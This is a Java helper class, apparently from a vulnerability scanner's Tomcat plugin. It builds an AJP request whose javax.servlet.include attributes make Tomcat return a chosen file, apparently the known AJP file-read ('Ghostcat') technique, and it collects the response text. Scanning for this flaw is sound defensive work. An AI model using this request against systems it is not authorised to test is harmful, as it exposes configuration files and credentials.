package com.gbw.scanner.plugins.scripts.web.tomcat;

import com.gbw.scanner.Host;

import java.util.List;

public class GBWAJPUtils {

    public static GBWAJPMessage createAJPMessage(Host host, GBWScanAJPConfig config){

        GBWAJPForwardRequest request = new GBWAJPForwardRequest(host,config.getUri());

        request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_ACCEPT),"text/html");
        request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_CONNECTION),"keep-alive");
        request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_CONTENT_LENGTH),"0");

        request.addAttr("req_attribute","javax.servlet.include.request_uri,/");
        request.addAttr("req_attribute",String.format("javax.servlet.include.path_info,%s",config.getFile()));
        request.addAttr("req_attribute","javax.servlet.include.servlet_path,/");

        request.setIs_ssl(config.isSSL());
        request.setData_direction(GBWAJPConstants.SERVER_TO_CONTAINER);
        return request.createMessage(4096);
    }

    public static String getText(List<GBWAJPResponse> responses){

        StringBuffer sb = new StringBuffer();
        responses.forEach(res->{
            sb.append(new String(res.getData()));
        });

        return sb.toString();
    }
}
